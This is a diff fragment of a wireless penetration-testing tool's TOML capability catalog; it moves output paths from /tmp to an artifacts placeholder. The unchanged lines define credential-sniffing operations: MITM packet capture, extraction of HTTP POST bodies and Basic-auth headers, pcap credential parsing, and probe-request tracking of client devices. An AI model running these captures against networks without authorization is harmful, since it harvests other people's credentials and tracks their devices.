+args = ['rd_report.py', '--in', '{artifacts}/rd/', '--out', '{artifacts}/rd_report.json']
 output = 'json'
 network = false
 [[capability.provider]]
 binary = 'cat'
 [[capability.provider.operation]]
 name = 'Victim List Review'
-args = ['/tmp/rd/victims.txt']
+args = ['{artifacts}/rd/victims.txt']
 output = 'lines'
 network = false
 [[capability]]
@@ -24022,61 +24022,61 @@ network = false
 binary = 'tcpdump'
 [[capability.provider.operation]]
 name = 'Mitm Traffic Capture'
-args = ['-i', '{iface}', '-nn', '-w', '/tmp/mitm/mitm.pcap', '-c', '5000']
+args = ['-i', '{iface}', '-nn', '-w', '{artifacts}/mitm/mitm.pcap', '-c', '5000']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'tshark'
 [[capability.provider.operation]]
 name = 'Http Cred Extract'
-args = ['-r', '/tmp/mitm/mitm.pcap', '-Y', 'http.request.method==POST', '-T', 'fields', '-e', 'http.file_data']
+args = ['-r', '{artifacts}/mitm/mitm.pcap', '-Y', 'http.request.method==POST', '-T', 'fields', '-e', 'http.file_data']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = 'Dns Query Extract'
-args = ['-r', '/tmp/mitm/mitm.pcap', '-Y', 'dns', '-T', 'fields', '-e', 'dns.qry.name', '-c', '200']
+args = ['-r', '{artifacts}/mitm/mitm.pcap', '-Y', 'dns', '-T', 'fields', '-e', 'dns.qry.name', '-c', '200']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Basic Auth Hunt'
-args = ['-a', '-oE', 'Authorization: Basic [A-Za-z0-9+/=]+', '/tmp/mitm/http.txt']
+args = ['-a', '-oE', 'Authorization: Basic [A-Za-z0-9+/=]+', '{artifacts}/mitm/http.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Pcap Cred Parse'
-args = ['pcap_creds.py', '--in', '/tmp/mitm/mitm.pcap', '--out', '/tmp/mitm/creds.json']
+args = ['pcap_creds.py', '--in', '{artifacts}/mitm/mitm.pcap', '--out', '{artifacts}/mitm/creds.json']
 output = 'json'
 network = false
 [[capability.provider]]
 binary = 'sort'
 [[capability.provider.operation]]
 name = 'Dns Query Dedup'
-args = ['-u', '/tmp/mitm/dns_queries.txt']
+args = ['-u', '{artifacts}/mitm/dns_queries.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'wc'
 [[capability.provider.operation]]
 name = 'Cred Hit Count'
-args = ['-l', '/tmp/mitm/creds.txt']
+args = ['-l', '{artifacts}/mitm/creds.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'file'
 [[capability.provider.operation]]
 name = 'Mitm Cap Verify'
-args = ['/tmp/mitm/mitm.pcap']
+args = ['{artifacts}/mitm/mitm.pcap']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sha256sum'
 [[capability.provider.operation]]
 name = 'Mitm Evidence Hash'
-args = ['/tmp/mitm/creds.json']
+args = ['{artifacts}/mitm/creds.json']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -24097,14 +24097,14 @@ network = false
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Mitm Report Build'
-args = ['mitm_report.py', '--in', '/tmp/mitm/creds.json', '--out', '/tmp/mitm_report.json']
+args = ['mitm_report.py', '--in', '{artifacts}/mitm/creds.json', '--out', '{artifacts}/mitm_report.json']
 output = 'json'
 network = false
 [[capability.provider]]
 binary = 'cat'
 [[capability.provider.operation]]
 name = 'Sniffed Cred Review'
-args = ['/tmp/mitm/creds.txt']
+args = ['{artifacts}/mitm/creds.txt']
 output = 'lines'
 network = false
 [[capability]]
@@ -24112,7 +24112,7 @@ id = 'wireless.packet-analysis'
 phase = 'wireless'
 label = 'PACKET ANALYSIS'
 summary = 'Deep 802.11 frame analysis for security assessment'
-inputs = [ { key = 'pcap', type = 'file', required = false, default = '/tmp/cap/full_band-01.cap' } ]
+inputs = [ { key = 'pcap', type = 'file', required = false, default = '{artifacts}/cap/full_band-01.cap' } ]
 [[capability.provider]]
 binary = 'tshark'
 [[capability.provider.operation]]
@@ -24143,14 +24143,14 @@ network = false
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Retransmission Hunt'
-args = ['-c', 'retrans', '/tmp/analysis/tshark_io.txt']
+args = ['-c', 'retrans', '{artifacts}/analysis/tshark_io.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Frame Type Histogram'
-args = ['frame_hist.py', '--in', '{pcap}', '--out', '/tmp/analysis/hist.json']
+args = ['frame_hist.py', '--in', '{pcap}', '--out', '{artifacts}/analysis/hist.json']
 output = 'json'
 network = false
 [[capability.provider]]
@@ -24169,14 +24169,14 @@ network = false
 binary = 'wc'
 [[capability.provider.operation]]
 name = 'Frame Count Tally'
-args = ['-l', '/tmp/analysis/frames.txt']
+args = ['-l', '{artifacts}/analysis/frames.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sort'
 [[capability.provider.operation]]
 name = 'Client Mac Dedup'
-args = ['-u', '/tmp/analysis/clients.txt']
+args = ['-u', '{artifacts}/analysis/clients.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -24197,7 +24197,7 @@ network = false
 binary = 'cat'
 [[capability.provider.operation]]
 name = 'Io Stats Review'
-args = ['/tmp/analysis/tshark_io.txt']
+args = ['{artifacts}/analysis/tshark_io.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -24211,7 +24211,7 @@ network = false
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Packet Report Build'
-args = ['packet_report.py', '--in', '/tmp/analysis/', '--out', '/tmp/packet_report.json']
+args = ['packet_report.py', '--in', '{artifacts}/analysis/', '--out', '{artifacts}/packet_report.json']
 output = 'json'
 network = false
 [[capability.provider]]
@@ -24225,7 +24225,7 @@ network = false
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Anomaly Score Compute'
-args = ['anomaly_score.py', '--in', '/tmp/analysis/hist.json']
+args = ['anomaly_score.py', '--in', '{artifacts}/analysis/hist.json']
 output = 'json'
 network = false
 [[capability]]
@@ -24238,12 +24238,12 @@ inputs = [ { key = 'iface', type = 'text', required = false, default = 'wlan0mon
 binary = 'airodump-ng'
 [[capability.provider.operation]]
 name = '2g Band Survey'
-args = ['{iface}', '--band', 'b', '--write', '/tmp/spec/survey_2g']
+args = ['{iface}', '--band', 'b', '--write', '{artifacts}/spec/survey_2g']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = '5g Band Survey'
-args = ['{iface}', '--band', 'a', '--write', '/tmp/spec/survey_5g']
+args = ['{iface}', '--band', 'a', '--write', '{artifacts}/spec/survey_5g']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -24262,14 +24262,14 @@ network = false
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Rtl Sdr Iq Capture'
-args = ['rtl_capture.py', '--freq', '2437000000', '--samples', '1000000', '--out', '/tmp/spec/iq.bin']
+args = ['rtl_capture.py', '--freq', '2437000000', '--samples', '1000000', '--out', '{artifacts}/spec/iq.bin']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Fft Spectrum Compute'
-args = ['fft_analyze.py', '--in', '/tmp/spec/iq.bin', '--out', '/tmp/spec/fft.json']
+args = ['fft_analyze.py', '--in', '{artifacts}/spec/iq.bin', '--out', '{artifacts}/spec/fft.json']
 output = 'json'
 network = false
 [[capability.provider]]
@@ -24283,56 +24283,56 @@ network = false
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Busy Channel Extract'
-args = ['-iE', 'busy|noise|time.*busy', '/tmp/spec/survey.txt']
+args = ['-iE', 'busy|noise|time.*busy', '{artifacts}/spec/survey.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sort'
 [[capability.provider.operation]]
 name = 'Channel Util Sort'
-args = ['-k', '2', '-r', '/tmp/spec/util.txt']
+args = ['-k', '2', '-r', '{artifacts}/spec/util.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'wc'
 [[capability.provider.operation]]
 name = 'Ap Per Channel Count'
-args = ['-l', '/tmp/spec/ch_aps.txt']
+args = ['-l', '{artifacts}/spec/ch_aps.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'file'
 [[capability.provider.operation]]
 name = 'Iq Artifact Verify'
-args = ['/tmp/spec/iq.bin']
+args = ['{artifacts}/spec/iq.bin']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sha256sum'
 [[capability.provider.operation]]
 name = 'Spec Evidence Hash'
-args = ['/tmp/spec/fft.json']
+args = ['{artifacts}/spec/fft.json']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Overlap Detector'
-args = ['channel_overlap.py', '--in', '/tmp/spec/survey_2g-01.csv']
+args = ['channel_overlap.py', '--in', '{artifacts}/spec/survey_2g-01.csv']
 output = 'json'
 network = false
 [[capability.provider]]
 binary = 'cat'
 [[capability.provider.operation]]
 name = 'Survey Csv Review'
-args = ['/tmp/spec/survey_5g-01.csv']
+args = ['{artifacts}/spec/survey_5g-01.csv']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Spectrum Report Build'
-args = ['spec_report.py', '--in', '/tmp/spec/', '--out', '/tmp/spec_report.json']
+args = ['spec_report.py', '--in', '{artifacts}/spec/', '--out', '{artifacts}/spec_report.json']
 output = 'json'
 network = false
 [[capability.provider]]
@@ -24352,110 +24352,110 @@ inputs = [ { key = 'iface', type = 'text', required = false, default = 'wlan0mon
 binary = 'tcpdump'
 [[capability.provider.operation]]
 name = 'Probe Request Capture'
-args = ['-i', '{iface}', '-nn', '-w', '/tmp/probe/probes.pcap', '-c', '3000', 'type mgt subtype probe-req']
+args = ['-i', '{iface}', '-nn', '-w', '{artifacts}/probe/probes.pcap', '-c', '3000', 'type mgt subtype probe-req']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'tshark'
 [[capability.provider.operation]]
 name = 'Probe Ssid Extract'
-args = ['-r', '/tmp/probe/probes.pcap', '-T', 'fields', '-e', 'wlan.sa', '-e', 'wlan.ssid', '-Y', 'wlan.fc.type_subtype==4']
+args = ['-r', '{artifacts}/probe/probes.pcap', '-T', 'fields', '-e', 'wlan.sa', '-e', 'wlan.ssid', '-Y', 'wlan.fc.type_subtype==4']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = 'Randomized Mac Flag'
-args = ['-r', '/tmp/probe/probes.pcap', '-T', 'fields', '-e', 'wlan.sa', '-e', 'wlan.wlan_sec', '-Y', 'wlan.fc.type_subtype==4']
+args = ['-r', '{artifacts}/probe/probes.pcap', '-T', 'fields', '-e', 'wlan.sa', '-e', 'wlan.wlan_sec', '-Y', 'wlan.fc.type_subtype==4']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Oui Vendor Map'
-args = ['oui_map.py', '--in', '/tmp/probe/probes.pcap', '--out', '/tmp/probe/vendors.json']
+args = ['oui_map.py', '--in', '{artifacts}/probe/probes.pcap', '--out', '{artifacts}/probe/vendors.json']
 output = 'json'
 network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Wildcard Probe Hunt'
-args = ['-iE', 'length:0|broadcast', '/tmp/probe/ssids.txt']
+args = ['-iE', 'length:0|broadcast', '{artifacts}/probe/ssids.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sort'
 [[capability.provider.operation]]
 name = 'Probe Client Dedup'
-args = ['-u', '/tmp/probe/clients.txt']
+args = ['-u', '{artifacts}/probe/clients.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'wc'
 [[capability.provider.operation]]
 name = 'Probe Client Count'
-args = ['-l', '/tmp/probe/clients.txt']
+args = ['-l', '{artifacts}/probe/clients.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Probe Cluster Build'
-args = ['probe_cluster.py', '--in', '/tmp/probe/probes.pcap', '--out', '/tmp/probe/clusters.json']
+args = ['probe_cluster.py', '--in', '{artifacts}/probe/probes.pcap', '--out', '{artifacts}/probe/clusters.json']
 output = 'json'
 network = false
 [[capability.provider]]
 binary = 'airodump-ng'
 [[capability.provider.operation]]
 name = 'Probe Station Monitor'
-args = ['{iface}', '--write', '/tmp/probe/stations', '--output-format', 'csv']
+args = ['{iface}', '--write', '{artifacts}/probe/stations', '--output-format', 'csv']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'tshark'
 [[capability.provider.operation]]
 name = 'Rsn Cap Privacy Check'
-args = ['-r', '/tmp/probe/probes.pcap', '-T', 'fields', '-e', 'wlan.rsn.capabilities', '-c', '100']
+args = ['-r', '{artifacts}/probe/probes.pcap', '-T', 'fields', '-e', 'wlan.rsn.capabilities', '-c', '100']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'file'
 [[capability.provider.operation]]
 name = 'Probe Cap Verify'
-args = ['/tmp/probe/probes.pcap']
+args = ['{artifacts}/probe/probes.pcap']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sha256sum'
 [[capability.provider.operation]]
 name = 'Probe Evidence Hash'
-args = ['/tmp/probe/clusters.json']
+args = ['{artifacts}/probe/clusters.json']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'cat'
 [[capability.provider.operation]]
 name = 'Vendor Map Review'
-args = ['/tmp/probe/vendors.json']
+args = ['{artifacts}/probe/vendors.json']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Privacy Score Compute'
-args = ['privacy_score.py', '--in', '/tmp/probe/clusters.json']
+args = ['privacy_score.py', '--in', '{artifacts}/probe/clusters.json']
 output = 'json'
 network = false
 [[capability.provider]]
 binary = 'sort'
 [[capability.provider.operation]]
 name = 'Ssid Leak Dedup'
-args = ['-u', '/tmp/probe/leaked_ssids.txt']
+args = ['-u', '{artifacts}/probe/leaked_ssids.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Probe Report Build'
-args = ['probe_report.py', '--in', '/tmp/probe/', '--out', '/tmp/probe_report.json']
+args = ['probe_report.py', '--in', '{artifacts}/probe/', '--out', '{artifacts}/probe_report.json']
 output = 'json'
 network = false
 [[capability]]
@@ -24533,35 +24533,35 @@ network = false
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Reachable Host Extract'
-args = ['-E', 'is alive', '/tmp/iso/fping.txt']
+args = ['-E', 'is alive', '{artifacts}/iso/fping.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sort'
 [[capability.provider.operation]]
 name = 'Reachable Host Dedup'
-args = ['-u', '/tmp/iso/reachable.txt']
+args = ['-u', '{artifacts}/iso/reachable.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'wc'
 [[capability.provider.operation]]
 name = 'Reachable Host Count'
-args = ['-l', '/tmp/iso/reachable.txt']
+args = ['-l', '{artifacts}/iso/reachable.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'file'
 [[capability.provider.operation]]
 name = 'Iso Artifact Verify'
-args = ['/tmp/iso/reachable.txt']
+args = ['{artifacts}/iso/reachable.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sha256sum'
 [[capability.provider.operation]]
 name = 'Iso Evidence Hash'
-args = ['/tmp/iso/reachable.txt']
+args = ['{artifacts}/iso/reachable.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -24575,14 +24575,14 @@ network = false
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Iso Report Build'
-args = ['iso_report.py', '--in', '/tmp/iso/', '--out', '/tmp/iso_report.json']
+args = ['iso_report.py', '--in', '{artifacts}/iso/', '--out', '{artifacts}/iso_report.json']
 output = 'json'
 network = false
 [[capability.provider]]
 binary = 'cat'
 [[capability.provider.operation]]
 name = 'Smb Hit Review'
-args = ['/tmp/iso/smb_hits.txt']
+args = ['{artifacts}/iso/smb_hits.txt']
 output = 'lines'
 network = false
 [[capability]]
@@ -24595,123 +24595,123 @@ inputs = [ { key = 'domain', type = 'domain', required = false, default = '' } ]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Master Report Build'
-args = ['wireless_master.py', '--indir', '/tmp/', '--out', '/tmp/wireless_report.md']
+args = ['wireless_master.py', '--indir', '{artifacts}/', '--out', '{artifacts}/wireless_report.md']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'cat'
 [[capability.provider.operation]]
 name = 'Ap Inventory Merge'
-args = ['/tmp/ap_inventory.csv']
+args = ['{artifacts}/ap_inventory.csv']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = 'Handshake Log Merge'
-args = ['/tmp/hs_report.json']
+args = ['{artifacts}/hs_report.json']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Critical Finding Sweep'
-args = ['-riE', 'wep|opn|cracked|pixie|bypass', '/tmp/wireless_report.md']
+args = ['-riE', 'wep|opn|cracked|pixie|bypass', '{artifacts}/wireless_report.md']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'wc'
 [[capability.provider.operation]]
 name = 'Report Line Count'
-args = ['-l', '/tmp/wireless_report.md']
+args = ['-l', '{artifacts}/wireless_report.md']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'file'
 [[capability.provider.operation]]
 name = 'Report Artifact Verify'
-args = ['/tmp/wireless_report.md', '/tmp/wireless_master.json']
+args = ['{artifacts}/wireless_report.md', '{artifacts}/wireless_master.json']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sha256sum'
 [[capability.provider.operation]]
 name = 'Report Hash Snapshot'
-args = ['/tmp/wireless_report.md']
+args = ['{artifacts}/wireless_report.md']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sort'
 [[capability.provider.operation]]
 name = 'Finding Dedup Sort'
-args = ['-u', '/tmp/findings.txt']
+args = ['-u', '{artifacts}/findings.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Risk Score Compute'
-args = ['risk_score.py', '--in', '/tmp/findings.txt', '--out', '/tmp/risk.json']
+args = ['risk_score.py', '--in', '{artifacts}/findings.txt', '--out', '{artifacts}/risk.json']
 output = 'json'
 network = false
 [[capability.provider]]
 binary = 'ls'
 [[capability.provider.operation]]
 name = 'Evidence Manifest Build'
-args = ['-lh', '/tmp/cap/', '/tmp/hs/', '/tmp/pmkid/']
+args = ['-lh', '{artifacts}/cap/', '{artifacts}/hs/', '{artifacts}/pmkid/']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'diff'
 [[capability.provider.operation]]
 name = 'Baseline Findings Diff'
-args = ['/tmp/findings_prev.txt', '/tmp/findings.txt']
+args = ['{artifacts}/findings_prev.txt', '{artifacts}/findings.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'cat'
 [[capability.provider.operation]]
 name = 'Final Report Review'
-args = ['/tmp/wireless_report.md']
+args = ['{artifacts}/wireless_report.md']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Executive Summary Build'
-args = ['exec_summary.py', '--in', '/tmp/wireless_master.json', '--out', '/tmp/wireless_exec.md']
+args = ['exec_summary.py', '--in', '{artifacts}/wireless_master.json', '--out', '{artifacts}/wireless_exec.md']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Remediation Tag Sweep'
-args = ['-riE', 'wpa3|pmf|rotation|isolation', '/tmp/wireless_exec.md']
+args = ['-riE', 'wpa3|pmf|rotation|isolation', '{artifacts}/wireless_exec.md']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'wc'
 [[capability.provider.operation]]
 name = 'Finding Count Tally'
-args = ['-l', '/tmp/findings.txt']
+args = ['-l', '{artifacts}/findings.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'file'
 [[capability.provider.operation]]
 name = 'Exec Summary Verify'
-args = ['/tmp/wireless_exec.md']
+args = ['{artifacts}/wireless_exec.md']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sha256sum'
 [[capability.provider.operation]]
 name = 'Exec Summary Hash'
-args = ['/tmp/wireless_exec.md']
+args = ['{artifacts}/wireless_exec.md']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Final Json Export'
-args = ['final_export.py', '--out', '/tmp/wireless_final.json']
+args = ['final_export.py', '--out', '{artifacts}/wireless_final.json']
 output = 'json'
 network = false
